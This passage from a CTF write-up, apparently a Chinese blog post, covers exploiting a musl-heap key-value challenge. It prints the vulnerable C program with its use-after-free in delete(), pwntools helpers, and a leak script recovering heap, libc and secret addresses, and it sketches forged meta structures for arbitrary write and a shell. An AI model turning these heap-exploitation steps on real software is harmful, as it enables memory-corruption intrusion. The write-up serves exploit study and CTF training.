class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recvuntil</span><span class="params">(<span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">if</span> (read(<span class="number">0</span>, &amp;c, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="type">char</span> *)buf)[i] = c;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            ((<span class="type">char</span> *)buf)[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">readint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    recvuntil(&amp;buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_key</span><span class="params">(<span class="type">uint8_t</span> **key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> key_size = readint();</span><br><span class="line">    *key = <span class="built_in">calloc</span>(<span class="number">1</span>, key_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*key, key_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">read_value</span><span class="params">(<span class="type">uint8_t</span> **value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value size: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> value_size = readint();</span><br><span class="line">    *value = <span class="built_in">calloc</span>(<span class="number">1</span>, value_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value content: &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> recvuntil(*value, value_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> *key;</span><br><span class="line">    <span class="type">uint8_t</span> *value;</span><br><span class="line">    <span class="type">size_t</span> key_size;</span><br><span class="line">    <span class="type">size_t</span> value_size;</span><br><span class="line">    <span class="type">uint64_t</span> hash;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">// struct node *prev;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">2021</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">value_dump</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_MASK (HASH_SIZE - 1)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">list_heads</span>[<span class="title">HASH_SIZE</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: query&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;option: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> node *<span class="title function_">lookup</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = key_hash(key, key_size);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">struct</span> node *n = list_heads[h &amp; HASH_MASK]; n; n = n-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n-&gt;hash == h &amp;&amp; n-&gt;key_size == key_size &amp;&amp; !<span class="built_in">memcmp</span>(key, n-&gt;key, key_size)) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">node</span> =</span> <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">    node-&gt;key_size = read_key(&amp;node-&gt;key);</span><br><span class="line">    <span class="comment">// always insert to the head, don&#x27;t check duplicated entries</span></span><br><span class="line">    node-&gt;value_size = read_value(&amp;node-&gt;value);</span><br><span class="line">    node-&gt;hash = key_hash(node-&gt;key, node-&gt;key_size);</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> h = node-&gt;hash &amp; HASH_MASK;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span> =</span> list_heads[h];</span><br><span class="line">    list_heads[h] = node;</span><br><span class="line">    node-&gt;next = next;</span><br><span class="line">    <span class="comment">// node-&gt;prev = NULL;</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">query</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value_dump(n-&gt;value, n-&gt;value_size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> key_size = read_key(&amp;key);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">n</span> =</span> lookup(key, key_size);</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> node **p = &amp;list_heads[n-&gt;hash &amp; HASH_MASK];</span><br><span class="line">        <span class="keyword">if</span> (*p == n || n-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// above condition is buggy</span></span><br><span class="line">            <span class="comment">// remove `n` from the linked list</span></span><br><span class="line">            <span class="keyword">while</span> (*p != n) &#123;</span><br><span class="line">                p = &amp;(*p)-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            *p = n-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// uaf: if `n` is at the tail of the linked list</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;key);</span><br><span class="line">        <span class="built_in">free</span>(n-&gt;value);</span><br><span class="line">        <span class="built_in">free</span>(n);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> op = readint();</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                store();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                query();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;invalid&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>很好，一做题就废，跟着<code>sung3r</code>师傅的文章才一步一步的复现出来，这里就对<code>sung3r</code>的文章进行部分补充<br>需要注意：需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code><br>可以看到<code>query()</code>函数每次打印的数据是该哈希链表最外侧结点的数据，而插入结点则是将结点插入最内侧<br>可以看到<code>delete()</code>函数当<code>n</code>为哈希链表的尾部且该哈希链表的结点个数大于一个时，会跳过循环直接进行<code>free</code>，存在<code>UAF</code>漏洞<br>每次<code>store</code>时，都会申请<code>0x30</code>大小的空间来存储改结点的信息，该空间结构为：</p><img src="/2024/01/17/musl/6.png" class="" title="我的图图呢">  <p>交互脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>这里粘贴<code>sung3r</code>师傅关于<code>group</code>对<code>chunk</code>的管理策略：</p><ul><li><code>chunk</code>按照内存先后，依次分配</li><li><code>free</code>掉的<code>chunk</code>不能马上分配</li><li>需要等<code>group</code>内所有<code>chunk</code>都处于<code>freed</code>或者<code>used</code>状态时，才会将<code>freed</code>状态的<code>chunk</code>转换成<code>avaliable</code></li><li>分配<code>chunk</code>时，会将<code>user data</code>域用<code>\x00</code>初始化</li></ul><p>接下来即可利用堆风水来进行地址的泄露<br>我们首先申请随便申请一个堆块，来防止防止<code>free</code>掉<code>group</code>所有<code>chunk</code>时，将整个<code>group</code>内存归还给堆管理器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>我们来看看此时的<code>group</code>的情况：</p><img src="/2024/01/17/musl/7.png" class="" title="我的图图呢">  <p>可以发现，该存储<code>0x30</code>大小堆块的<code>group</code>最多可以存储<code>7</code>个堆块<br>接下来，除最后一个与第一个<code>chunk</code>，其余全部<code>free</code>掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><img src="/2024/01/17/musl/8.png" class="" title="我的图图呢">  <p>接下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>group的布局为：</p><img src="/2024/01/17/musl/9.png" class="" title="我的图图呢">  <p>再申请一个与’\n’同hash的chunk：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个时候<code>’\n’</code>的哈希链表中就有两个元素，<code>group</code>的布局为：</p><img src="/2024/01/17/musl/10.png" class="" title="我的图图呢">  <p>此时将<code>key</code>为<code>’\n’</code>的堆块删除并将<code>group</code>未被使用的堆块全部<code>free</code>掉:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>由前面的分析可以知道，此时触发的<code>UAF</code>漏洞，被标为<code>UAF</code>的堆块即为<code>’\n’</code>堆块的<code>value</code>区域，我们可以通过将另一个堆块的<code>struct</code>结构体申请到这里，从而通过<code>query</code>函数访问<code>’\n’</code>来泄露出<code>value</code>的地址。此时<code>group</code>的布局为：</p><img src="/2024/01/17/musl/11.png" class="" title="我的图图呢">  <p>最后申请一个堆块泄露地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>group布局为：</p><img src="/2024/01/17/musl/12.png" class="" title="我的图图呢">  <p>同样，我们也能够用相同的策略将<code>libc</code>基地址等内存信息<code>leak</code>出来<br>leak代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br></pre></td></tr></table></figure><p>泄露出地址后，即可通过伪造<code>meta_area、meta、mem</code>来利用<code>unlink</code>，实现任意地址写，此时即可在<code>stdout</code>中写入<code>fake file</code>然后<code>getshell</code><br>即<code>2</code>次<code>free</code>掉自己伪造的<code>group</code>来实现任意地址分配<br>嘶，好像有点说不清，跟着<code>exp</code>一步一步调试即可知道详细原理<code>QWQ</code>，<code>unlink</code>的和<code>fsop</code>的原理上面有讲过(晚点补，如果有机会的话)<br>其实我感觉<code>meta</code>的伪造好像可以当成模板来使用？</p><h3 id="exp"><a href="#exp" class="headerlink" 